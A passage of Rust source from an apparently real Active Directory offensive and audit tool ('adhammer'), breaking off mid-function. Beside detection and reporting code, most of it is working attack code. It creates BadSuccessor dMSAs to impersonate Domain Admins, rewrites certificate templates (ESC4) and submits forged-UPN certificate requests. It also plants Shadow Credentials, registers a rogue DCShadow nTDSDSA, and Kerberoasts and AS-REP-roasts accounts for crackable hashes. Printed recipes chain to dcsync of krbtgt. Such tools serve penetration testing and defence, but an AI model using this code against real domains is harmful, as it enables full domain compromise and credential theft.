fn ber(tag: u8, val: &[u8]) -> Vec<u8> {
    let mut out = vec![tag];
    let len = val.len();
    if len < 0x80 {
        out.push(len as u8);
    } else if len < 0x100 {
        out.extend_from_slice(&[0x81, len as u8]);
    } else {
        out.extend_from_slice(&[0x82, (len >> 8) as u8, len as u8]);
    }
    out.extend_from_slice(val);
    out
}
fn ber_seq(val: &[u8]) -> Vec<u8> {
    ber(0x30, val)
}

/// Walk BER and return the last printable OCTET STRING value — the sysDescr in an SNMP reply.
fn snmp_first_octet_string(buf: &[u8]) -> Option<String> {
    let mut i = 0;
    let mut best: Option<String> = None;
    while i + 2 <= buf.len() {
        let tag = buf[i];
        let mut len = buf[i + 1] as usize;
        let mut hdr = 2;
        if len == 0x81 && i + 2 < buf.len() {
            len = buf[i + 2] as usize;
            hdr = 3;
        } else if len == 0x82 && i + 3 < buf.len() {
            len = ((buf[i + 2] as usize) << 8) | buf[i + 3] as usize;
            hdr = 4;
        }
        if tag == 0x30 || tag == 0xa0 || tag == 0xa2 {
            i += hdr; // descend into constructed types
            continue;
        }
        if i + hdr + len > buf.len() {
            break;
        }
        if tag == 0x04 && len >= 4 {
            let v = &buf[i + hdr..i + hdr + len];
            if v.iter().all(|&b| (0x20..0x7f).contains(&b)) {
                best = Some(String::from_utf8_lossy(v).to_string());
            }
        }
        i += hdr + len;
    }
    best
}

/// Expand a target spec: `@file` (one host/line), `a.b.c.d/nn` CIDR, or a comma list.
fn expand_targets(spec: &str) -> Result<Vec<String>> {
    if let Some(file) = spec.strip_prefix('@') {
        let content = std::fs::read_to_string(file).context("read targets file")?;
        return Ok(content
            .lines()
            .map(|l| l.trim().to_string())
            .filter(|l| !l.is_empty())
            .collect());
    }
    if spec.contains('/') {
        let (base, prefix) = spec.split_once('/').unwrap();
        let ip: std::net::Ipv4Addr = base.parse().context("bad CIDR address")?;
        let prefix: u32 = prefix.parse().context("bad CIDR prefix")?;
        anyhow::ensure!((8..=32).contains(&prefix), "CIDR prefix must be 8..=32");
        let host_bits = 32 - prefix;
        let size = if host_bits == 0 {
            1u32
        } else {
            1u32 << host_bits
        };
        let mask = if host_bits == 0 {
            u32::MAX
        } else {
            !(size - 1)
        };
        let net = u32::from(ip) & mask;
        // Skip network + broadcast addresses for blocks with room for them.
        let (start, end) = if prefix <= 30 {
            (1, size - 1)
        } else {
            (0, size)
        };
        return Ok((start..end)
            .map(|i| std::net::Ipv4Addr::from(net + i).to_string())
            .collect());
    }
    Ok(spec
        .split(',')
        .map(|s| s.trim().to_string())
        .filter(|s| !s.is_empty())
        .collect())
}

async fn esc_registry_probe(
    host: &str,
    domain: &str,
    user: &str,
    password: &str,
    ca_names: &[String],
) -> Result<Vec<adhammer_core::Finding>> {
    use dcerpc::rrp::RegistryClient;
    use smb2_client::SmbClient;

    let mut smb = SmbClient::connect(host).await?;
    smb.login(host, domain, user, password).await?;
    smb.tree_connect(&format!("\\\\{host}\\IPC$")).await?;
    let mut reg = RegistryClient::connect(&mut smb, domain, user, password, host).await?;

    let mut all = Vec::new();
    for ca in ca_names {
        all.extend(esc_registry::probe_esc_registry(&mut reg, ca).await);
    }
    Ok(all)
}

fn config(a: &ScanArgs) -> LdapConfig {
    LdapConfig {
        url: a.url.clone(),
        bind_dn: a.user.clone(),
        password: a.password.clone(),
        base_dn: a.base_dn.clone(),
        insecure: a.insecure,
        gssapi: a.gssapi,
    }
}

async fn scan(a: ScanArgs) -> Result<()> {
    let sp = ui::Spinner::start("collecting AD objects over LDAP");
    let snap = Collector::connect(&config(&a)).await?.collect().await?;
    sp.done(&format!("{} AD object(s) collected", snap.objects.len()));
    tracing::info!(objects = snap.objects.len(), "collected");

    let graph = ControlGraph::build(&snap);
    let stats = graph.stats();
    let paths = graph.paths_to_tier0();
    let mut findings = adhammer_checks::run_all(&snap, &graph);
    {
        let crit = findings
            .iter()
            .filter(|f| matches!(f.severity, adhammer_core::finding::Severity::Critical))
            .count();
        ui::ok(&format!(
            "{} finding(s) ({crit} critical) · {} control-path(s) to Tier-0",
            findings.len(),
            paths.len()
        ));
    }

    // The cheapest routes, hop by hop, with the command that walks each hop. A hop with no
    // executor is printed as such rather than silently skipped.
    for p in paths.iter().take(5) {
        eprintln!("\n[>] {} (cost {})", p.render(), p.cost);
        for (i, s) in p.steps.iter().enumerate() {
            match &s.command {
                Some(c) => eprintln!("    {}. {:<26} {}", i + 1, s.edge, c),
                None => eprintln!("    {}. {:<26} (detection only)", i + 1, s.edge),
            }
            eprintln!("       fix: {}", s.mitigation);
        }
    }

    // Optional BloodHound export (BloodHound CE v5 ingest .zip) alongside the report.
    if let Some(path) = &a.bloodhound {
        let p = std::path::Path::new(path);
        let n = adhammer_bloodhound::export_zip(&snap, p)?;
        eprintln!("[+] BloodHound export: {} JSON files → {}", n, p.display());
    }

    // ESC registry probe: ESC6/7/10/11/16 via MS-RRP over the DC's Remote Registry.
    // Runs automatically when a CA is discovered in the LDAP snapshot. Best-effort — if the
    // Remote Registry service is stopped the scan still completes with passive findings only.
    {
        let ca_names: Vec<String> = snap
            .iter_class("pKIEnrollmentService")
            .filter_map(|o| o.one("cn").or_else(|| o.one("name")).map(|s| s.to_string()))
            .collect();
        if !ca_names.is_empty() {
            let host = a
                .url
                .split("://")
                .nth(1)
                .unwrap_or(&a.url)
                .split('/')
                .next()
                .unwrap_or("")
                .split(':')
                .next()
                .unwrap_or("")
                .to_string();
            let domain = snap.domain.netbios.clone().unwrap_or_else(|| {
                snap.domain
                    .domain_dn
                    .split(',')
                    .find_map(|p| {
                        p.trim()
                            .strip_prefix("DC=")
                            .or_else(|| p.trim().strip_prefix("dc="))
                    })
                    .unwrap_or("")
                    .to_uppercase()
            });
            let user = a
                .user
                .split('@')
                .next()
                .and_then(|s| s.split('\\').next_back())
                .unwrap_or(&a.user)
                .to_string();
            let sp = ui::Spinner::start("ESC registry probe (MS-RRP)");
            match esc_registry_probe(&host, &domain, &user, &a.password, &ca_names).await {
                Ok(esc_findings) => {
                    let n = esc_findings.len();
                    findings.extend(esc_findings);
                    if n > 0 {
                        sp.done(&format!(
                            "{n} registry-based ESC finding(s) (ESC6/7/10/11/16)"
                        ));
                    } else {
                        sp.done("no registry-based ESC exposure");
                    }
                }
                Err(e) => {
                    let msg = e.to_string();
                    if msg.contains("0xc00000ac") || msg.contains("winreg") {
                        sp.done_warn(
                            "Remote Registry unavailable — ESC6/7/10/11/16 skipped (passive checks unaffected)",
                        );
                    } else {
                        sp.done_warn(&format!("ESC registry probe failed: {e:#}"));
                    }
                }
            }
        }
    }

    // ESC8 web-enrollment probe: check each CA host for HTTP NTLM relay exposure.
    {
        let ca_hosts: Vec<String> = snap
            .iter_class("pKIEnrollmentService")
            .filter_map(|o| o.one("dNSHostName").map(|s| s.to_string()))
            .filter(|h| !h.is_empty())
            .collect();
        for host in &ca_hosts {
            if let Some(_detail) = esc8_probe(host).await {
                findings.push(adhammer_core::Finding {
                    id: "A-Esc8".into(),
                    title: format!(
                        "ESC8: web enrollment at http://{host}/certsrv exposes NTLM (relayable)"
                    ),
                    category: adhammer_core::finding::Category::Anomalies,
                    severity: adhammer_core::finding::Severity::Critical,
                    mitre: vec![adhammer_core::finding::mitre::CERT_ABUSE],
                    affected: vec![host.clone()],
                    detail: format!(
                        "The CA at {host} exposes HTTP web enrollment with NTLM authentication \
                         over cleartext — a coerced machine's NTLM can be relayed for a cert, \
                         then PKINIT'd for that machine's TGT."
                    ),
                    impact: Some(
                        "Attacker coerces a DC (PetitPotam/PrinterBug), relays its NTLM to \
                         the web enrollment endpoint, obtains a machine cert, PKINITs for the \
                         DC's TGT, then DCSync. Full domain compromise from any authenticated user."
                            .into(),
                    ),
                    remediation:
                        "Disable HTTP web enrollment or require HTTPS + Extended Protection (EPA); \
                         enforce SMB/LDAP signing to blunt the relay."
                            .into(),
                    weight_bonus: 30,
                });
            }
        }
    }

    // Optional SYSVOL sweep: GPP cpasswords (MS14-025) + default-policy signing/NTLM.
    if let Some(sysvol) = &a.sysvol {
        let root = std::path::Path::new(sysvol);
        let hits = adhammer_sysvol::scan(root);
        tracing::info!(gpp = hits.len(), "sysvol GPP swept");
        if let Some(f) = adhammer_sysvol::finding(&hits) {
            findings.insert(0, f);
        }
        let policy = adhammer_sysvol::gptmpl::scan_policy(root);
        findings.extend(adhammer_sysvol::gptmpl::policy_findings(&policy));
    }

    let report = Report::build(
        &snap.domain.domain_dn,
        findings,
        paths,
        stats,
        &RiskConfig::default(),
    );

    match a.format.as_str() {
        "html" => println!("{}", report.to_html()),
        _ => println!("{}", report.to_json()),
    }
    Ok(())
}

/// `attack badsuccessor` — Akamai/Yuval Gordon 2025 dMSA escalation. Any principal that can
/// create a child object in *any* container can create a delegated MSA whose
/// `msDS-ManagedAccountPrecededByLink` points at a Domain Admin, and set
/// `msDS-DelegatedMSAState=2` (Migrated). The Server 2025 KDC then issues TGTs to the dMSA
/// carrying the *victim's* PAC — full impersonation, no ACE on the victim, no password reset.
///
/// LIVE VALIDATION OWED: the attack landed on Server 2025 GA; behaviour on later Cumulative
/// Updates may change. Run against the 2025 DC on your matrix and confirm the dMSA is
/// accepted (LDAP add succeeds) and issues a working TGT.
async fn badsuccessor(a: BadsuccessorArgs) -> Result<()> {
    use adhammer_collector::{Collector, LdapConfig};
    let cfg = LdapConfig {
        url: a.url.clone(),
        bind_dn: a.user.clone(),
        password: a.password.clone(),
        base_dn: None,
        insecure: a.insecure,
        gssapi: false,
    };
    let mut c = Collector::connect(&cfg).await?;
    let victim_dn = c.resolve_dn(&a.target).await?;
    let base = c.base_dn().to_string();
    let container = a
        .container
        .clone()
        .unwrap_or_else(|| format!("CN=Managed Service Accounts,{base}"));

    let name = a.dmsa_name.trim_end_matches('$');
    let sam = format!("{name}$");
    let dn = format!("CN={name},{container}");
    // Derive DNS domain from base DN: "DC=testlab,DC=local" -> "testlab.local".
    let dns_domain: String = base
        .split(',')
        .filter_map(|p| {
            p.trim()
                .strip_prefix("DC=")
                .or_else(|| p.trim().strip_prefix("dc="))
        })
        .collect::<Vec<_>>()
        .join(".");
    let dns_host = format!("{name}.{dns_domain}");

    // dMSA is a subclass of msDS-GroupManagedServiceAccount (structural, inherits from computer).
    // Adding `computer`/`user`/`person` explicitly conflicts with the schema on Server 2025 —
    // let the structural chain resolve them.
    let attrs: Vec<(&str, Vec<Vec<u8>>)> = vec![
        (
            "objectClass",
            vec![
                b"top".to_vec(),
                b"msDS-DelegatedManagedServiceAccount".to_vec(),
            ],
        ),
        ("sAMAccountName", vec![sam.as_bytes().to_vec()]),
        ("dNSHostName", vec![dns_host.as_bytes().to_vec()]),
        // UAC = WORKSTATION_TRUST_ACCOUNT (0x1000).
        ("userAccountControl", vec![b"4096".to_vec()]),
        // AES256 | AES128 | RC4 = 28 (minimum modern default).
        ("msDS-SupportedEncryptionTypes", vec![b"28".to_vec()]),
        // Required by gMSA schema — 30 days is the default rotation.
        ("msDS-ManagedPasswordInterval", vec![b"30".to_vec()]),
        // 2 = kMSA_MIGRATED — the "successor" state the KDC recognises.
        ("msDS-DelegatedMSAState", vec![b"2".to_vec()]),
        // The victim link — the KDC issues the dMSA a TGT with THIS account's PAC.
        (
            "msDS-ManagedAccountPrecededByLink",
            vec![victim_dn.as_bytes().to_vec()],
        ),
    ];
    c.add_object(&dn, attrs).await?;
    println!("[+] created dMSA {dn}");
    println!(
        "    → succeeds {} (PAC of the victim is issued to {sam})",
        a.target
    );
    println!(
        "    Next: request a TGT as {sam} and use it as if it were {}",
        a.target
    );
    Ok(())
}

/// `attack esc4` — weaponize a certificate template we can write. Flip the two flags that make
/// a template ESC1-vulnerable: `msPKI-Certificate-Name-Flag |= ENROLLEE_SUPPLIES_SUBJECT`, and
/// `msPKI-Enrollment-Flag &= ~PEND_ALL_REQUESTS`. Optionally grant `--enrollee` an Enroll ACE.
/// After this runs, `attack esc1 --template <name> --alt-name Administrator` finishes the chain.
async fn esc4(a: Esc4Args) -> Result<()> {
    use adhammer_collector::{Collector, LdapConfig};
    const CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT: i64 = 0x0000_0001;
    const CT_FLAG_PEND_ALL_REQUESTS: i64 = 0x0000_0002;

    let cfg = LdapConfig {
        url: a.url.clone(),
        bind_dn: a.user.clone(),
        password: a.password.clone(),
        base_dn: None,
        insecure: a.insecure,
        gssapi: false,
    };
    let mut c = Collector::connect(&cfg).await?;
    let base = c.base_dn().to_string();
    let template_dn = format!(
        "CN={},CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,{base}",
        a.template
    );

    // Read current flags, flip, write back. Replace-modify is safe because the values are
    // scalar u32-in-string form.
    let (name_flag, enroll_flag) = c.read_template_flags(&template_dn).await?;
    let new_name = name_flag | CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT;
    let new_enroll = enroll_flag & !CT_FLAG_PEND_ALL_REQUESTS;
    c.write_binary(
        &template_dn,
        "msPKI-Certificate-Name-Flag",
        new_name.to_string().into_bytes(),
    )
    .await?;
    c.write_binary(
        &template_dn,
        "msPKI-Enrollment-Flag",
        new_enroll.to_string().into_bytes(),
    )
    .await?;
    println!(
        "[+] {template_dn}: msPKI-Certificate-Name-Flag {name_flag}→{new_name} (SUPPLIES_SUBJECT), \
         msPKI-Enrollment-Flag {enroll_flag}→{new_enroll} (cleared PEND_ALL_REQUESTS)"
    );

    if let Some(enrollee) = &a.enrollee {
        eprintln!(
            "[!] --enrollee {enrollee}: Enroll-ACE write on template DACL not implemented \
                   yet — flags alone often suffice if the template is already broadly enrollable. \
                   Set the ACE manually or via `attack abuse` if needed."
        );
    }
    println!(
        "    → attack esc1 --template {} --alt-name Administrator",
        a.template
    );
    Ok(())
}

/// `attack shadowcred` — thin, top-level command for Shadow Credentials. Under the hood this
/// is `attack abuse --action add-keycred` (and, with `--pkinit`, `--action pkinit`).
async fn shadowcred(a: ShadowcredArgs) -> Result<()> {
    // Phase 1: plant the KeyCredential.
    abuse(AbuseArgs {
        url: Some(a.url.clone()),
        user: Some(a.user.clone()),
        password: Some(a.password.clone()),
        insecure: a.insecure,
        action: "add-keycred".into(),
        target: a.target.clone(),
        value: String::new(),
        kdc: a.kdc.clone(),
        realm: a.realm.clone(),
        ldap389: false,
        host: None,
    })
    .await?;
    if a.pkinit {
        let (kdc, realm) = match (a.kdc.as_ref(), a.realm.as_ref()) {
            (Some(k), Some(r)) => (k.clone(), r.clone()),
            _ => anyhow::bail!("--pkinit needs both --kdc and --realm"),
        };
        // Phase 2: PKINIT with the freshly-planted key to obtain a TGT as the target.
        abuse(AbuseArgs {
            url: Some(a.url),
            user: Some(a.user),
            password: Some(a.password),
            insecure: a.insecure,
            action: "pkinit".into(),
            target: a.target,
            value: String::new(),
            kdc: Some(kdc),
            realm: Some(realm),
            ldap389: false,
            host: None,
        })
        .await?;
    }
    Ok(())
}

/// `attack dcshadow` — enumerate accounts that already hold DCSync replication rights
/// (Replicating Directory Changes All / In Filtered Set / Get Changes). Every principal on
/// this list can already dump secrets — and every non-Tier-0 principal on it is a straight
/// path to Domain Admin. Full DCShadow *push* (register a rogue nTDSDSA + trigger DrsReplicaAdd)
/// is not implemented — building it without a live 2016+/2019+/2022+/2025 matrix would ship
/// blind protocol code. Once the matrix is up, this command grows the push side.
async fn dcshadow(a: DcshadowArgs) -> Result<()> {
    // Prep / cleanup take precedence over the detector; they mutate the target.
    if let Some(name) = a.prep.as_deref() {
        use adhammer_collector::Collector;
        let mut coll = Collector::connect(&config(&a.scan)).await?;
        let dns = dcshadow::prep(&mut coll, name, &a.site).await?;
        println!("[+] DCShadow prep registered rogue nTDSDSA");
        println!("    Server : {}", dns.server_dn);
        println!("    NTDS   : {}", dns.ntds_dn);
        println!();
        println!(
            "    Cleanup: `attack dcshadow --cleanup {name} --site {}`",
            a.site
        );
        return Ok(());
    }
    if let Some(name) = a.cleanup.as_deref() {
        use adhammer_collector::Collector;
        let mut coll = Collector::connect(&config(&a.scan)).await?;
        dcshadow::cleanup(&mut coll, name, &a.site).await?;
        println!(
            "[+] DCShadow cleanup removed rogue nTDSDSA '{name}' under site '{}'",
            a.site
        );
        return Ok(());
    }
    use adhammer_graph::ControlPrimitive as P;
    let snap = Collector::connect(&config(&a.scan))
        .await?
        .collect()
        .await?;
    let graph = adhammer_graph::ControlGraph::build(&snap);
    let mut who = Vec::new();
    for kind in [
        P::DcsyncGetChanges,
        P::DcsyncGetChangesAll,
        P::DcsyncGetChangesFiltered,
    ] {
        for (src, dst) in graph.direct_edges_to_tier0(kind.into()) {
            who.push((src, dst, kind));
        }
    }
    if who.is_empty() {
        println!("== DCShadow-capable principals ==");
        println!("  (none found — no principal outside Tier-0 holds replication rights)");
    } else {
        println!("== DCShadow-capable principals ({}) ==", who.len());
        for (src, dst, kind) in &who {
            println!("  {src:<32} → {dst}   [{}]", kind.name());
        }
        println!();
        println!(
            "These already have DCSync. Each is a shortcut to DA — running `attack dcsync --user krbtgt`"
        );
        println!("as any of them dumps the whole domain without a lateral move.");
    }
    Ok(())
}

/// `check adcs` — pull every `pKICertificateTemplate` from the domain, run the
/// `ms-crtd` ESC1-15 rule pack over the typed view, and emit adhammer `Finding`s.
/// Offline pass — no ACL walk, no CA registry probe, no active enrollment; the
/// exhaustive ESC pipeline is `adhammer scan` (which fires the parallel
/// `A-AdcsEsc` rule alongside the graph-based paths).
async fn check_adcs(a: CheckAdcsArgs) -> Result<()> {
    let cfg = LdapConfig {
        url: a.url.clone(),
        bind_dn: a.user.clone(),
        password: a.password.clone(),
        base_dn: None,
        insecure: a.insecure,
        gssapi: false,
    };
    let snap = Collector::connect(&cfg).await?.collect().await?;
    let templates =
        adhammer_collector::sources::adcs::templates_from(snap.objects.iter().collect::<Vec<_>>());
    let findings = adhammer_checks::rules::esc::detect_all(&templates);
    if a.json {
        let j = serde_json::to_string_pretty(&findings)?;
        println!("{j}");
    } else {
        println!(
            "== check adcs (ms-crtd ESC rule pack) — {} template(s) scanned, {} finding(s) ==",
            templates.len(),
            findings.len()
        );
        for f in &findings {
            println!(
                "[{:?}] {} — {}\n  affected: {}\n  {}\n",
                f.severity,
                f.id,
                f.title,
                f.affected.join(", "),
                f.detail
            );
        }
    }
    Ok(())
}

/// `dump laps` — read LAPS local-admin passwords. The `ms-gkdi`-first wire path
/// (parse `msLAPS-EncryptedPassword` header via `sources::gkdi::parse_key_identifier`,
/// fetch the GKDI envelope, derive the L2 key locally) is not yet plumbed end-to-end
/// through the `ISDKey` sealed RPC in adhammer's transport; today this command
/// prints a hint and defers to the mature `attack laps` code path.
async fn dump_laps(a: DumpLapsArgs) -> Result<()> {
    eprintln!(
        "[!] `dump laps` is DEPRECATED and will be removed in 1.5.0 — use `attack laps` (same \
         functionality, one command per capability). The GKDI-first offline-derive path lives in \
         `adhammer_collector::sources::gkdi` for callers who want the library primitive."
    );
    let _ = a.dc; // reserved for the ms-gkdi path
    laps(LapsArgs {
        target: a.target,
        url: a.url,
        user: a.user,
        password: a.password,
        insecure: a.insecure,
    })
    .await
}

/// `dump gmsa` — read a gMSA's `msDS-ManagedPassword` blob. Same status as
/// `dump laps`: the seed-key derivation lives in `sources::gkdi`, but the
/// LDAP-attribute-fetch path already handles gMSA end-to-end via
/// `attack gmsa` (`msDS-ManagedPassword` over a sealed LDAP channel).
async fn dump_gmsa(a: DumpGmsaArgs) -> Result<()> {
    eprintln!(
        "[!] `dump gmsa` is DEPRECATED and will be removed in 1.5.0 — use `attack gmsa` (same \
         functionality, one command per capability)."
    );
    gmsa(GmsaArgs {
        url: a.url,
        user: a.user,
        password: a.password,
        insecure: a.insecure,
        target: a.target,
    })
    .await
}

/// `attack icpr-esc1` — build an ESC1 CSR via `ms-icpr` with an attacker-supplied UPN
/// SAN and marshal the `CertServerRequest` opnum-0 input stub. Offline: writes the
/// CSR + stub to disk (and a fresh RSA key if none supplied) so the wire can be
/// verified before a live submission. The sealed `\PIPE\cert` transport requires
/// `ms-icpr`'s `network` feature — disabled in this build to keep the workspace
/// off the `dcerpc↔ms-nrpc` resolver cycle — and stays a TODO here.
async fn icpr_esc1(a: IcprEsc1Args) -> Result<()> {
    use ms_crtd::flags::{EnrollmentFlag, NameFlag, PrivateKeyFlag};
    use ms_crtd::model::CertTemplate;
    use ms_crtd::oid::Oid;

    let key_pem = if let Some(path) = &a.key {
        std::fs::read(path).with_context(|| format!("read --key {path}"))?
    } else {
        use rsa::pkcs8::EncodePrivateKey;
        use rsa::RsaPrivateKey;
        let mut rng = rand::thread_rng();
        let key = RsaPrivateKey::new(&mut rng, 2048).context("generate RSA-2048 for CSR")?;
        let pem = key
            .to_pkcs8_pem(rsa::pkcs8::LineEnding::LF)
            .context("encode key PKCS#8 PEM")?;
        let pem_bytes = pem.as_bytes().to_vec();
        let key_path = format!("{}.key.pem", a.csr_out);
        std::fs::write(&key_path, &pem_bytes)?;
        eprintln!("[+] generated 2048-bit RSA key → {key_path}");
        pem_bytes
    };

    // Build the CSR according to the ESC variant. ESC1/ESC6 use the plain
    // UPN-SAN CSR; ESC15 injects an EKU via Microsoft Application Policies
    // (EKUwu shape); ESC3 builds the plain CSR, and the CMS EOBO wrapping
    // happens later in the dispatch section below.
    let csr = match a.esc {
        EscVariant::Esc15 => ms_icpr::build_csr_with_upn_san_and_ekus(
            &a.subject,
            &a.target_upn,
            &[a.esc15_eku.as_str()],
            &key_pem,
            ms_icpr::EkuCarrier::ApplicationPolicies,
        )
        .context("build_csr_with_upn_san_and_ekus (esc15)")?,
        _ => ms_icpr::build_csr_with_upn_san(&a.subject, &a.target_upn, &key_pem)
            .context("build_csr_with_upn_san")?,
    };
    std::fs::write(&a.csr_out, &csr)?;
    eprintln!(
        "[+] CSR built (variant={:?}, subject CN={}, SAN otherName+UPN={}) → {} ({} bytes)",
        a.esc,
        a.subject,
        a.target_upn,
        a.csr_out,
        csr.len()
    );

    // Synthesize a minimal `CertTemplate` — with no LDAP fetch here, this stand-in
    // exists purely to make `IcprClient::marshal_call` preflight pass so the stub
    // bytes can be materialised. Live submissions run through `attack esc1` today.
    let template = CertTemplate {
        name: a.template.clone(),
        oid: Oid::new("1.3.6.1.4.1.311.21.8.1.42"),
        schema_version: a.schema_version.unwrap_or(2),
        enrollment_flag: EnrollmentFlag::empty(),
        name_flag: NameFlag::ENROLLEE_SUPPLIES_SUBJECT,
        private_key_flag: PrivateKeyFlag::empty(),
        ekus: vec![Oid::new("1.3.6.1.5.5.7.3.2")],
        min_ra_signatures: 0,
        raw_security_descriptor: None,
    };
    // Always emit the offline stub so consumers can diff / replay
    let stub_client = ms_icpr::IcprClient::stub(a.ca.clone());
    let stub = stub_client
        .marshal_call(&template, &csr)
        .context("ms_icpr::IcprClient::marshal_call")?;
    std::fs::write(&a.out, &stub)?;
    eprintln!(
        "[+] marshaled CertServerRequest stub → {} ({} bytes, opnum {})",
        a.out,
        stub.len(),
        ms_icpr::CERT_SERVER_REQUEST_OPNUM
    );

    // Live submit path — enabled via ms-icpr's `network` feature (default on after
    // dcerpc 0.2.3 resolver-cycle fix). Requires --host + --domain + --user.
    if let Some(host) = a.host.as_deref() {
        let domain = a
            .domain
            .as_deref()
            .ok_or_else(|| anyhow::anyhow!("--domain required when --host is set"))?;
        let user = a
            .user
            .as_deref()
            .ok_or_else(|| anyhow::anyhow!("--user required when --host is set"))?;
        eprintln!(
            "[*] submitting to {} \\\\PIPE\\\\cert (CA={}) as {}\\{}",
            host, a.ca, domain, user
        );
        let mut client =
            ms_icpr::IcprClient::connect(host, domain, user, &a.password, a.ca.clone())
                .context("ms_icpr::IcprClient::connect (sealed \\PIPE\\cert)")?;
        let submit_result = match a.esc {
            EscVariant::Esc1 | EscVariant::Esc15 => client.submit_request(&template, &csr),
            EscVariant::Esc6 => {
                let san = a.san_upn.as_deref().unwrap_or(a.target_upn.as_str());
                client.submit_request_esc6(&template, &csr, san)
            }
            EscVariant::Esc3 => {
                let agent_cert_path = a
                    .agent_cert
                    .as_deref()
                    .ok_or_else(|| anyhow::anyhow!("--agent-cert required with --esc esc3"))?;
                let agent_key_path = a
                    .agent_key
                    .as_deref()
                    .ok_or_else(|| anyhow::anyhow!("--agent-key required with --esc esc3"))?;
                let agent_cert = std::fs::read(agent_cert_path)
                    .with_context(|| format!("read --agent-cert {agent_cert_path}"))?;
                let agent_key = std::fs::read(agent_key_path)
                    .with_context(|| format!("read --agent-key {agent_key_path}"))?;
                let signing_time = std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .map(|d| d.as_secs() as i64)
                    .unwrap_or(0);
                let cms_blob =
                    ms_icpr::build_esc3_request(&csr, &agent_cert, &agent_key, signing_time)
                        .context("ms_icpr::build_esc3_request (CMC EOBO)")?;
                eprintln!(
                    "[+] built CMS-signed CMC blob ({} bytes) — submitting as enrollment-agent-on-behalf-of {}",
                    cms_blob.len(),
                    a.target_upn
                );
                client.submit_request_esc3(&template, &cms_blob)
            }
        };
        match submit_result {
            Ok(issued) => {
                let cert_path = format!("{}.issued.pem", a.csr_out);
                std::fs::write(&cert_path, &issued.pem)?;
                eprintln!(
                    "[+] cert ISSUED (request_id={}) → {} ({} bytes)",
                    issued.request_id,
                    cert_path,
                    issued.pem.len()
                );
                eprintln!(
                    "[+] chain into `attack pkinit --cert {} --key {}.key.pem --upn {}` to obtain a TGT",
                    cert_path, a.csr_out, a.target_upn
                );
            }
            Err(e) => {
                eprintln!("[-] live submit failed: {e}");
                eprintln!(
                    "[i] the offline stub is still available at {} for diagnostic / replay",
                    a.out
                );
                return Err(e.into());
            }
        }
    } else {
        eprintln!(
            "[i] offline mode — no --host provided. To submit live, add: \
             --host <CA-fqdn> --domain <NETBIOS> --user <user> --password <pw>"
        );
    }
    Ok(())
}

/// `attack unconstrained` — locate hosts running with `TRUSTED_FOR_DELEGATION` (UAC bit 0x80000)
/// and print the abuse recipe for each. A domain controller carrying the bit is expected
/// (that's what makes it a DC); a *non-DC* with the bit is the abuse target — every user's TGT
/// that authenticates there is cached, and the DC can be coerced to be one of those users.
///
/// LDAP-only recon; no host is contacted. The exploit chain itself runs in later commands
/// (`attack coerce` for the trigger, capture/extraction to walk off with the TGT).
async fn unconstrained(a: ScanArgs) -> Result<()> {
    use adhammer_core::object::uac;
    /// SERVER_TRUST_ACCOUNT — the UAC bit that marks a computer as a domain controller.
    /// A DC's own delegation bit is not the abuse: it's inherent to being a DC.
    const SERVER_TRUST_ACCOUNT: u32 = 0x0000_2000;

    let snap = Collector::connect(&config(&a)).await?.collect().await?;
    let mut risky: Vec<(&str, &str)> = Vec::new(); // (sAM, DN) of non-DC hosts w/ the bit
    let mut dc_baseline = 0usize;
    let mut proto_transition: Vec<(&str, &str)> = Vec::new(); // constrained w/ protocol transition

    for o in &snap.objects {
        let u = o.uac();
        if u == 0 {
            continue;
        }
        let sam = o.one("sAMAccountName").unwrap_or("");
        let is_dc = u & SERVER_TRUST_ACCOUNT != 0;
        if u & uac::TRUSTED_FOR_DELEGATION != 0 {
            if is_dc {
                dc_baseline += 1;
            } else {
                risky.push((sam, &o.dn));
            }
        }
        if u & uac::TRUSTED_TO_AUTH_FOR_DELEGATION != 0 {
            proto_transition.push((sam, &o.dn));
        }
    }

    println!(
        "== Unconstrained delegation ({} DC baseline, {} risky non-DC host(s)) ==",
        dc_baseline,
        risky.len()
    );
    if risky.is_empty() {
        println!("  (none — only DCs carry TRUSTED_FOR_DELEGATION, which is expected)");
    } else {
        for (sam, dn) in &risky {
            println!("  [!] {sam:<28}  {dn}");
        }
        println!();
        println!("Abuse recipe (once you control one of these hosts):");
        println!("  1. attack coerce --host <DC> --pipe efsrpc  --listener <this-host>");
        println!("     (or --pipe spoolss|netdfs|fssagentrpc)");
        println!("  2. Capture the incoming Kerberos AP-REQ on this host.");
        println!("  3. Extract the forwarded TGT from the Authenticator (GSS-KRB5 Deleg flag).");
        println!("  4. attack dcsync --user krbtgt   (or golden-ticket forge)");
    }

    if !proto_transition.is_empty() {
        println!();
        println!(
            "== Constrained delegation w/ protocol transition ({}) — S4U2Self abuse ==",
            proto_transition.len()
        );
        for (sam, dn) in &proto_transition {
            println!("  {sam:<28}  {dn}");
        }
        println!("  → attack constrained --host <this-host> --target <spn>");
    }
    Ok(())
}

async fn roast(a: ScanArgs) -> Result<()> {
    let snap = Collector::connect(&config(&a)).await?.collect().await?;
    let realm = snap
        .domain
        .domain_dn
        .split(',')
        .filter_map(|p| p.strip_prefix("DC="))
        .collect::<Vec<_>>()
        .join(".")
        .to_uppercase();
    let (kerberoast, asrep) = adhammer_kerberos::candidates(&snap, &realm);

    println!("== Kerberoastable ({}) ==", kerberoast.len());
    match &a.kdc {
        None => {
            for c in &kerberoast {
                println!("  {}  spn={}", c.sam, c.spn.as_deref().unwrap_or("-"));
            }
        }
        Some(kdc) if !kerberoast.is_empty() => {
            // One authenticated TGT, then a TGS-REQ per SPN.
            match adhammer_kerberos::get_tgt(&a.user, &a.password, &realm, kdc).await {
                Err(e) => eprintln!("  TGT acquisition failed: {e}"),
                Ok(tgt) => {
                    for c in &kerberoast {
                        let spn = c.spn.as_deref().unwrap_or_default();
                        match adhammer_kerberos::roast_spn(&tgt, &c.sam, spn, kdc).await {
                            Ok(hash) => println!("{hash}"),
                            Err(e) => eprintln!("  {}: {e}", c.sam),
                        }
                    }
                }
            }
        }
        Some(_) => {}
    }

    println!("== AS-REP roastable ({}) ==", asrep.len());
    match &a.kdc {
        None => {
            for c in &asrep {
                println!("  {}", c.sam);
            }
            if !asrep.is_empty() {
                eprintln!("(pass --kdc <host> to fetch hashcat 18200 hashes)");
            }
        }
        Some(kdc) => {
            for c in &asrep {
                match adhammer_kerberos::asrep_roast(c, kdc).await {
                    Ok(hash) => println!("{hash}"),
